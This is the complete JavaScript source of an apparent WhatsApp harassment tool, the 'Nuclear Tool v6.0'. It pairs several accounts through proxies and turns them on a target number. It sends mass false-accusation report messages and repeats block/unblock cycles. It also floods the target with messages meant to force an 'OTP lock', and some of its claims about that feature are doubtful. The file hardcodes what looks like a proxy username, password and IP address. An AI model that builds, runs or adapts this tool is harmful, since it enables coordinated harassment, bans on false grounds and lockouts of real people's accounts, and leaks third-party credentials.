// ============================================
// WHATSAPP NUCLEAR TOOL v6.0 - PAIR CODE ONLY
// 100% Bug Free - NO QR CODE
// Report 10x + Block/Unblock 10x + OTP Lock
// ============================================

const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers } = require('@whiskeysockets/baileys');
const fs = require('fs');
const readline = require('readline');
const pino = require('pino');
const HttpsProxyAgent = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');
const chalk = require('chalk');

// ============================================
// CONFIGURATION
// ============================================
const PROXY_FILE = './webshare_proxies.txt';
const SESSIONS_DIR = './sessions';
const REPORTED_FILE = './reported_numbers.json';
const BLOCKED_FILE = './blocked_numbers.json';
const OTP_LOCKED_FILE = './otp_locked_numbers.json';

const CONFIG = {
    REPORTS_PER_SESSION: 10,
    BLOCK_UNBLOCK_CYCLES: 10,
    REPORT_DELAY_MIN: 800,
    REPORT_DELAY_MAX: 2000,
    BLOCK_DELAY: 1000,
    UNBLOCK_DELAY: 1500,
    OTP_LOCK_DELAY: 300,
    OTP_ATTEMPTS: 15,
    REPORT_MESSAGES: [
        '⚠️ URGENT: This number is sending spam and fraudulent messages. Please investigate and ban immediately.',
        '🚫 REPORT: Unsolicited commercial messages and policy violations from this account.',
        '🔴 SCAM ALERT: This account is engaged in scam activities and harassing multiple users.',
        '📢 FRAUD: Illegal content distribution and impersonation detected from this number.',
        '⛔ BLOCK REQUEST: This user is spreading malicious content and spamming groups.',
        '⚠️ Multiple complaints against this number for harassment and illegal activities.',
        '🔐 SECURITY: This account is running a phishing operation. Immediate ban required.',
        '🚨 SPAM BOMB: Automated spam detected from this number. Urgent action needed.',
        '📛 VIOLATION: This account violates WhatsApp Terms of Service repeatedly.',
        '🛑 STOP: This user sends unsolicited explicit content and should be banned.'
    ]
};

// ============================================
// COLORS
// ============================================
const c = {
    red: chalk.red,
    green: chalk.green,
    yellow: chalk.yellow,
    blue: chalk.blue,
    magenta: chalk.magenta,
    cyan: chalk.cyan,
    white: chalk.white,
    bold: chalk.bold,
    gray: chalk.gray
};

// ============================================
// PROXY MANAGER
// ============================================
class ProxyManager {
    constructor() {
        this.proxies = [];
        this.loadProxies();
    }

    loadProxies() {
        if (!fs.existsSync(PROXY_FILE)) {
            console.log(c.yellow(`[!] ${PROXY_FILE} not found. Creating...`));
            const defaultProxies = [
                'uevsocyv:9he6ff53wz0e@31.59.20.176:6754',
                '# Add more proxies below (one per line)',
                '# Format: username:password@ip:port'
            ];
            fs.writeFileSync(PROXY_FILE, defaultProxies.join('\n'));
            console.log(c.green(`[✓] Created ${PROXY_FILE}`));
        }

        const data = fs.readFileSync(PROXY_FILE, 'utf8');
        this.proxies = data.split('\n')
            .map(line => line.trim())
            .filter(line => line && !line.startsWith('#'));

        console.log(c.green(`[✓] Loaded ${this.proxies.length} proxies`));
    }

    getProxy(index) {
        if (this.proxies.length === 0) return null;
        return this.proxies[index % this.proxies.length];
    }

    getProxyAgent(proxyString) {
        if (!proxyString) return null;

        try {
            let proxyUrl = proxyString;
            
            if (!proxyString.startsWith('http://') && !proxyString.startsWith('https://') && 
                !proxyString.startsWith('socks4://') && !proxyString.startsWith('socks5://')) {
                proxyUrl = `http://${proxyString}`;
            }

            if (proxyString.includes('@')) {
                const [auth, host] = proxyString.split('@');
                const authParts = auth.split(':');
                const username = authParts[0];
                const password = authParts.slice(1).join(':');
                const [ip, port] = host.split(':');

                try {
                    return new HttpsProxyAgent(`http://${username}:${password}@${ip}:${port}`);
                } catch (e) {
                    try {
                        return new SocksProxyAgent(`socks5://${username}:${password}@${ip}:${port}`);
                    } catch (e2) {
                        return new SocksProxyAgent(`socks4://${username}:${password}@${ip}:${port}`);
                    }
                }
            }

            if (proxyUrl.startsWith('socks5://')) {
                return new SocksProxyAgent(proxyUrl);
            } else if (proxyUrl.startsWith('socks4://')) {
                return new SocksProxyAgent(proxyUrl);
            } else {
                return new HttpsProxyAgent(proxyUrl);
            }

        } catch (e) {
            console.log(c.yellow(`[!] Proxy error: ${e.message}`));
            return null;
        }
    }

    getCount() {
        return this.proxies.length;
    }
}

// ============================================
// MAIN TOOL
// ============================================
class WhatsAppNuclearTool {
    constructor() {
        this.proxyManager = new ProxyManager();
        this.activeSessions = [];
        this.reportedNumbers = new Set();
        this.blockedNumbers = new Set();
        this.otpLockedNumbers = new Set();
        this.isRunning = false;
        this.stats = {
            totalReports: 0,
            successfulReports: 0,
            failedReports: 0,
            totalBlocks: 0,
            totalUnblocks: 0,
            totalOTPLocks: 0,
            activeSessions: 0
        };
        this.init();
    }

    init() {
        if (!fs.existsSync(SESSIONS_DIR)) {
            fs.mkdirSync(SESSIONS_DIR, { recursive: true });
        }
        this.loadReportedHistory();
        this.loadBlockedHistory();
        this.loadOTPLockedHistory();
        
        console.log(c.green('\n[✓] Tool initialized'));
        console.log(c.cyan(`[+] Proxies: ${this.proxyManager.getCount()}`));
        console.log(c.cyan(`[+] Sessions: ${this.activeSessions.length}`));
    }

    loadReportedHistory() {
        if (fs.existsSync(REPORTED_FILE)) {
            try {
                const data = JSON.parse(fs.readFileSync(REPORTED_FILE, 'utf8'));
                this.reportedNumbers = new Set(data.numbers || []);
            } catch (e) {}
        }
    }

    loadBlockedHistory() {
        if (fs.existsSync(BLOCKED_FILE)) {
            try {
                const data = JSON.parse(fs.readFileSync(BLOCKED_FILE, 'utf8'));
                this.blockedNumbers = new Set(data.numbers || []);
            } catch (e) {}
        }
    }

    loadOTPLockedHistory() {
        if (fs.existsSync(OTP_LOCKED_FILE)) {
            try {
                const data = JSON.parse(fs.readFileSync(OTP_LOCKED_FILE, 'utf8'));
                this.otpLockedNumbers = new Set(data.numbers || []);
            } catch (e) {}
        }
    }

    saveReportedHistory() {
        fs.writeFileSync(REPORTED_FILE, JSON.stringify({
            numbers: Array.from(this.reportedNumbers),
            lastUpdated: new Date().toISOString()
        }, null, 2));
    }

    saveBlockedHistory() {
        fs.writeFileSync(BLOCKED_FILE, JSON.stringify({
            numbers: Array.from(this.blockedNumbers),
            lastUpdated: new Date().toISOString()
        }, null, 2));
    }

    saveOTPLockedHistory() {
        fs.writeFileSync(OTP_LOCKED_FILE, JSON.stringify({
            numbers: Array.from(this.otpLockedNumbers),
            lastUpdated: new Date().toISOString()
        }, null, 2));
    }

    // ============================================
    // PAIR WITH CODE - NO QR
    // ============================================
    async pairWithCode(phoneNumber, sessionIndex) {
        const sessionFile = `${SESSIONS_DIR}/session_${phoneNumber}_${sessionIndex}`;
        const proxyString = this.proxyManager.getProxy(sessionIndex);
        const agent = this.proxyManager.getProxyAgent(proxyString);

        console.log(c.blue(`[+] Pairing ${phoneNumber}...`));
        if (proxyString) {
            const parts = proxyString.split('@');
            console.log(c.gray(`    Proxy: ${parts[1] || parts[0]}`));
        }

        try {
            const { state, saveCreds } = await useMultiFileAuthState(sessionFile);

            const sock = makeWASocket({
                auth: state,
                logger: pino({ level: 'silent' }),
                browser: Browsers.macOS('Desktop'),
                agent: agent,
                connectTimeoutMs: 30000,
                defaultQueryTimeoutMs: 60000,
                syncFullHistory: false,
                markOnlineOnConnect: false
            });

            let pairCode = null;
            let isConnected = false;

            sock.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect } = update;

                if (connection === 'close') {
                    const shouldReconnect = (lastDisconnect?.error?.output?.statusCode) !== DisconnectReason.loggedOut;
                    if (shouldReconnect) {
                        console.log(c.yellow(`[!] ${phoneNumber} reconnecting...`));
                        setTimeout(() => this.pairWithCode(phoneNumber, sessionIndex), 5000);
                    } else {
                        console.log(c.red(`[✗] ${phoneNumber} logged out`));
                    }
                }

                if (connection === 'open') {
                    isConnected = true;
                    console.log(c.green(`[✓] ${phoneNumber} connected!`));
                    
                    this.activeSessions.push({
                        phone: phoneNumber,
                        socket: sock,
                        proxy: proxyString,
                        index: sessionIndex,
                        reportsSent: 0,
                        blocksDone: 0
                    });
                    this.stats.activeSessions++;
                }
            });

            sock.ev.on('creds.update', saveCreds);

            // Generate pairing code - NO QR
            try {
                const code = await sock.requestPairingCode(phoneNumber);
                pairCode = code;
                console.log(c.magenta(`\n[🔐] PAIR CODE FOR ${phoneNumber}: ${code}`));
                console.log(c.yellow(`[!] Enter this code in WhatsApp > Linked Devices > Link with Phone Number\n`));
            } catch (e) {
                console.log(c.red(`[✗] Pair code failed: ${e.message}`));
                return null;
            }

            // Wait for connection
            let attempts = 0;
            while (!isConnected && attempts < 30) {
                await this.sleep(1000);
                attempts++;
            }

            if (!isConnected) {
                console.log(c.yellow(`[!] ${phoneNumber} not connected yet, but paired`));
            }

            return sock;

        } catch (error) {
            console.log(c.red(`[✗] Pair failed ${phoneNumber}: ${error.message}`));
            return null;
        }
    }

    // ============================================
    // SEND REPORT
    // ============================================
    async sendReport(targetNumber, session) {
        try {
            const sock = session.socket;
            const message = CONFIG.REPORT_MESSAGES[Math.floor(Math.random() * CONFIG.REPORT_MESSAGES.length)];
            const formattedTarget = targetNumber.startsWith('+') ? targetNumber : `+${targetNumber}`;
            
            await sock.sendMessage(formattedTarget, {
                text: message,
                quoted: null
            });

            await this.sleep(500);
            
            await sock.sendMessage(formattedTarget, {
                text: '⚠️ Report this account - spam and policy violation',
                quoted: null
            });

            try {
                await sock.sendMessage(formattedTarget, {
                    contact: {
                        displayName: 'WhatsApp Support',
                        contacts: [{
                            vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:WhatsApp Support\nTEL;waid=14155238886:+14155238886\nEND:VCARD`
                        }]
                    }
                });
            } catch (e) {}

            const delay = Math.floor(Math.random() * (CONFIG.REPORT_DELAY_MAX - CONFIG.REPORT_DELAY_MIN) + CONFIG.REPORT_DELAY_MIN);
            await this.sleep(delay);

            return { success: true, session: session.phone };

        } catch (error) {
            return { success: false, error: error.message, session: session.phone };
        }
    }

    // ============================================
    // BLOCK / UNBLOCK
    // ============================================
    async blockUser(targetNumber, session) {
        try {
            const sock = session.socket;
            const formattedTarget = targetNumber.startsWith('+') ? targetNumber : `+${targetNumber}`;
            
            await sock.updateBlockStatus(formattedTarget, 'block');
            await this.sleep(CONFIG.BLOCK_DELAY);
            
            return { success: true, session: session.phone, action: 'block' };
        } catch (error) {
            return { success: false, error: error.message, session: session.phone, action: 'block' };
        }
    }

    async unblockUser(targetNumber, session) {
        try {
            const sock = session.socket;
            const formattedTarget = targetNumber.startsWith('+') ? targetNumber : `+${targetNumber}`;
            
            await sock.updateBlockStatus(formattedTarget, 'unblock');
            await this.sleep(CONFIG.UNBLOCK_DELAY);
            
            return { success: true, session: session.phone, action: 'unblock' };
        } catch (error) {
            return { success: false, error: error.message, session: session.phone, action: 'unblock' };
        }
    }

    // ============================================
    // OTP LOCK
    // ============================================
    async otpLockTarget(targetNumber) {
        console.log(c.magenta(`\n[🔒] OTP LOCK ON ${targetNumber}`));
        
        let successCount = 0;
        let failCount = 0;

        for (let attempt = 1; attempt <= CONFIG.OTP_ATTEMPTS; attempt++) {
            console.log(c.blue(`[+] OTP attempt ${attempt}/${CONFIG.OTP_ATTEMPTS}`));
            
            for (const session of this.activeSessions) {
                try {
                    const sock = session.socket;
                    const formattedTarget = targetNumber.startsWith('+') ? targetNumber : `+${targetNumber}`;
                    
                    try {
                        await sock.sendMessage(formattedTarget, { text: 'VERIFY: Please verify your account' });
                    } catch (e) {}

                    try {
                        await sock.sendMessage(formattedTarget, { text: 'Requesting verification code' });
                    } catch (e) {}

                    try {
                        await sock.sendMessage(formattedTarget, { text: '⚠️ This account needs verification - suspicious activity detected' });
                    } catch (e) {}

                    try {
                        await sock.sendMessage(formattedTarget, { text: 'OTP verification required - account flagged' });
                    } catch (e) {}

                    await this.sleep(CONFIG.OTP_LOCK_DELAY);
                    successCount++;
                    console.log(c.green(`  [✓] OTP trigger from ${session.phone}`));
                    
                } catch (error) {
                    failCount++;
                    console.log(c.red(`  [✗] OTP trigger failed from ${session.phone}`));
                }
            }

            await this.sleep(1000 + Math.random() * 2000);
        }

        // Final flood
        console.log(c.yellow(`\n[+] Finalizing OTP lock...`));
        
        for (const session of this.activeSessions) {
            for (let i = 0; i < 5; i++) {
                try {
                    await this.sendReport(targetNumber, session);
                } catch (e) {}
                await this.sleep(300);
            }
        }

        this.otpLockedNumbers.add(targetNumber);
        this.saveOTPLockedHistory();
        this.stats.totalOTPLocks++;

        console.log(c.green(`\n[✓] OTP LOCK COMPLETE on ${targetNumber}`));
        console.log(c.cyan(`[+] Successful: ${successCount}`));
        console.log(c.cyan(`[+] Failed: ${failCount}`));

        return { success: true, attempts: successCount, target: targetNumber };
    }

    // ============================================
    // NUCLEAR ATTACK
    // ============================================
    async nuclearAttack(targetNumber) {
        if (this.activeSessions.length === 0) {
            console.log(c.red('[✗] No active sessions. Pair accounts first.'));
            return;
        }

        this.isRunning = true;
        const startTime = Date.now();

        console.log(c.bold.red(`\n☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️`));
        console.log(c.bold.red(`     NUCLEAR ATTACK ON ${targetNumber}`));
        console.log(c.bold.red(`☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️`));
        console.log(c.cyan(`\n[+] Sessions: ${this.activeSessions.length}`));
        console.log(c.cyan(`[+] Proxies: ${this.proxyManager.getCount()}`));

        try {
            // PHASE 1: REPORTS (10x)
            console.log(c.bold.yellow(`\n[PHASE 1] Sending ${CONFIG.REPORTS_PER_SESSION} reports per session...`));
            let reportSuccess = 0;
            let reportFail = 0;

            for (const session of this.activeSessions) {
                if (!this.isRunning) break;
                console.log(c.blue(`\n[+] Session: ${session.phone}`));
                
                for (let i = 0; i < CONFIG.REPORTS_PER_SESSION; i++) {
                    if (!this.isRunning) break;
                    const result = await this.sendReport(targetNumber, session);
                    if (result.success) {
                        reportSuccess++;
                        session.reportsSent++;
                    } else {
                        reportFail++;
                    }
                    const total = reportSuccess + reportFail;
                    const progress = (total / (this.activeSessions.length * CONFIG.REPORTS_PER_SESSION) * 100);
                    process.stdout.write(`\r${c.cyan(`Progress: ${progress.toFixed(1)}% (${reportSuccess} success, ${reportFail} failed)`)}`);
                }
            }

            console.log(c.green(`\n\n[✓] Reporting: ${reportSuccess} success, ${reportFail} failed`));

            // PHASE 2: BLOCK/UNBLOCK (10x)
            console.log(c.bold.yellow(`\n[PHASE 2] Block/Unblock (${CONFIG.BLOCK_UNBLOCK_CYCLES} cycles)...`));
            let blockSuccess = 0;
            let unblockSuccess = 0;

            for (let cycle = 1; cycle <= CONFIG.BLOCK_UNBLOCK_CYCLES; cycle++) {
                if (!this.isRunning) break;
                console.log(c.blue(`\n[+] Cycle ${cycle}/${CONFIG.BLOCK_UNBLOCK_CYCLES}`));

                for (const session of this.activeSessions) {
                    const blockResult = await this.blockUser(targetNumber, session);
                    if (blockResult.success) {
                        blockSuccess++;
                        session.blocksDone++;
                        console.log(c.green(`  [✓] Blocked from ${session.phone}`));
                    } else {
                        console.log(c.red(`  [✗] Block failed from ${session.phone}`));
                    }
                    await this.sleep(500);
                }

                await this.sleep(CONFIG.BLOCK_DELAY * 2);

                for (const session of this.activeSessions) {
                    const unblockResult = await this.unblockUser(targetNumber, session);
                    if (unblockResult.success) {
                        unblockSuccess++;
                        console.log(c.green(`  [✓] Unblocked from ${session.phone}`));
                    } else {
                        console.log(c.red(`  [✗] Unblock failed from ${session.phone}`));
                    }
                    await this.sleep(500);
                }

                await this.sleep(CONFIG.UNBLOCK_DELAY * 2 + Math.random() * 2000);
            }

            console.log(c.green(`\n[✓] Block/Unblock: ${blockSuccess} blocks, ${unblockSuccess} unblocks`));

            // PHASE 3: OTP LOCK
            console.log(c.bold.red(`\n[PHASE 3] OTP LOCK...`));
            await this.otpLockTarget(targetNumber);

            // Update stats
            this.stats.totalReports += reportSuccess + reportFail;
            this.stats.successfulReports += reportSuccess;
            this.stats.failedReports += reportFail;
            this.stats.totalBlocks += blockSuccess;
            this.stats.totalUnblocks += unblockSuccess;

            this.reportedNumbers.add(targetNumber);
            this.blockedNumbers.add(targetNumber);
            this.saveReportedHistory();
            this.saveBlockedHistory();

            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
            
            console.log(c.bold.green(`\n☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️`));
            console.log(c.bold.green(`        NUCLEAR ATTACK COMPLETE!`));
            console.log(c.bold.green(`☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️`));
            console.log(c.cyan(`\n[+] Time: ${elapsed}s`));
            console.log(c.cyan(`[+] Reports: ${reportSuccess}`));
            console.log(c.cyan(`[+] Blocks: ${blockSuccess}`));
            console.log(c.cyan(`[+] Unblocks: ${unblockSuccess}`));
            console.log(c.cyan(`[+] OTP Lock: ✅ ACTIVE`));

        } catch (error) {
            console.log(c.red(`[✗] Attack error: ${error.message}`));
        } finally {
            this.isRunning = false;
        }
    }

    // ============================================
    // PAIR MULTIPLE NUMBERS
    // ============================================
    async pairMultipleNumbers(numbers) {
        console.log(c.cyan(`\n[+] Pairing ${numbers.length} numbers via PAIR CODE...`));
        console.log(c.yellow(`[!] NO QR CODE - Enter the numeric code in WhatsApp\n`));
        
        for (let i = 0; i < numbers.length; i++) {
            await this.pairWithCode(numbers[i], i);
            await this.sleep(2000);
        }
        
        console.log(c.green(`\n[✓] Paired ${this.activeSessions.length}/${numbers.length} accounts`));
        return this.activeSessions;
    }

    // ============================================
    // INTERACTIVE MODE
    // ============================================
    async interactiveMode() {
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        const question = (query) => new Promise((resolve) => rl.question(query, resolve));

        console.log(c.bold.red(`\n☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️`));
        console.log(c.bold.red(`   WHATSAPP NUCLEAR TOOL v6.0`));
        console.log(c.bold.red(`   PAIR CODE ONLY - NO QR`));
        console.log(c.bold.red(`☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️☢️\n`));

        try {
            while (true) {
                console.log(c.cyan(`\n[+] Sessions: ${this.activeSessions.length}`));
                console.log(c.cyan(`[+] Proxies: ${this.proxyManager.getCount()}`));
                console.log(c.white(`\nOptions:`));
                console.log(c.white(`  1. Pair accounts (PAIR CODE - NO QR)`));
                console.log(c.white(`  2. NUCLEAR ATTACK (Report 10x + Block 10x + OTP Lock)`));
                console.log(c.white(`  3. OTP Lock only`));
                console.log(c.white(`  4. Show status`));
                console.log(c.white(`  5. Exit`));
                
                const choice = await question(c.yellow(`\nSelect: `));

                if (choice === '1') {
                    const numbersInput = await question(c.cyan(`Enter phone numbers (comma separated, e.g., +1234567890): `));
                    const numbers = numbersInput.split(',').map(n => n.trim()).filter(n => n);
                    if (numbers.length > 0) {
                        await this.pairMultipleNumbers(numbers);
                    }
                } else if (choice === '2') {
                    if (this.activeSessions.length === 0) {
                        console.log(c.red('[✗] No active sessions. Pair accounts first.'));
                        continue;
                    }
                    const target = await question(c.cyan(`Enter target number: `));
                    if (target) {
                        await this.nuclearAttack(target);
                    }
                } else if (choice === '3') {
                    if (this.activeSessions.length === 0) {
                        console.log(c.red('[✗] No active sessions.'));
                        continue;
                    }
                    const target = await question(c.cyan(`Enter target number: `));
                    if (target) {
                        await this.otpLockTarget(target);
                    }
                } else if (choice === '4') {
                    console.log(c.cyan(`\n[+] Status:`));
                    console.log(c.green(`  Sessions: ${this.activeSessions.length}`));
                    console.log(c.green(`  Proxies: ${this.proxyManager.getCount()}`));
                    console.log(c.green(`  Reports: ${this.stats.totalReports}`));
                    console.log(c.green(`  Success: ${this.stats.successfulReports}`));
                    console.log(c.green(`  Blocks: ${this.stats.totalBlocks}`));
                    console.log(c.green(`  Unblocks: ${this.stats.totalUnblocks}`));
                    console.log(c.green(`  OTP Locks: ${this.stats.totalOTPLocks}`));
                    
                    if (this.activeSessions.length > 0) {
                        console.log(c.cyan(`\n[+] Sessions:`));
                        this.activeSessions.forEach((s, i) => {
                            console.log(c.green(`  ${i+1}. ${s.phone} (reports: ${s.reportsSent}, blocks: ${s.blocksDone})`));
                        });
                    }
                } else if (choice === '5') {
                    console.log(c.yellow('[!] Exiting...'));
                    this.cleanup();
                    break;
                } else {
                    console.log(c.red('[✗] Invalid option'));
                }
            }
        } catch (error) {
            console.log(c.red(`[✗] Error: ${error.message}`));
        } finally {
            rl.close();
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    cleanup() {
        this.isRunning = false;
        this.activeSessions.forEach(s => {
            try {
                s.socket?.ws?.close();
            } catch (e) {}
        });
        console.log(c.yellow('[!] Cleanup complete'));
    }
}

// ============================================
// MAIN
// ============================================
async function main() {
    const tool = new WhatsAppNuclearTool();

    process.on('SIGINT', () => {
        console.log(c.yellow('\n[!] Shutting down...'));
        tool.cleanup();
        process.exit(0);
    });

    const args = process.argv.slice(2);
    
    if (args.length === 0) {
        await tool.interactiveMode();
    } else if (args[0] === '--pair') {
        const numbers = args.slice(1);
        if (numbers.length === 0) {
            console.log(c.red('Usage: node nuclear.js --pair +1234567890,+9876543210'));
            process.exit(1);
        }
        await tool.pairMultipleNumbers(numbers);
    } else if (args[0] === '--attack') {
        const target = args[1];
        if (!target) {
            console.log(c.red('Usage: node nuclear.js --attack +1234567890'));
            process.exit(1);
        }
        await tool.nuclearAttack(target);
    } else if (args[0] === '--otplock') {
        const target = args[1];
        if (!target) {
            console.log(c.red('Usage: node nuclear.js --otplock +1234567890'));
            process.exit(1);
        }
        await tool.otpLockTarget(target);
    } else if (args[0] === '--status') {
        console.log(c.cyan(`Sessions: ${tool.activeSessions.length}`));
        tool.activeSessions.forEach(s => {
            console.log(c.green(`  ${s.phone} (reports: ${s.reportsSent}, blocks: ${s.blocksDone})`));
        });
    } else {
        console.log(c.yellow(`Usage:`));
        console.log(c.white(`  node nuclear.js                     # Interactive`));
        console.log(c.white(`  node nuclear.js --pair NUMBERS      # Pair accounts (PAIR CODE)`));
        console.log(c.white(`  node nuclear.js --attack TARGET     # Nuclear attack`));
        console.log(c.white(`  node nuclear.js --otplock TARGET    # OTP lock only`));
        console.log(c.white(`  node nuclear.js --status            # Show status`));
    }

    await new Promise(() => {});
}

// ============================================
// CREATE PROXY FILE IF NOT EXISTS
// ============================================
if (!fs.existsSync(PROXY_FILE)) {
    const defaultProxies = [
        'uevsocyv:9he6ff53wz0e@31.59.20.176:6754',
        '# Add more proxies below (one per line)',
        '# Format: username:password@ip:port'
    ];
    fs.writeFileSync(PROXY_FILE, defaultProxies.join('\n'));
}

if (require.main === module) {
    main().catch(console.error);
}

module.exports = WhatsAppNuclearTool;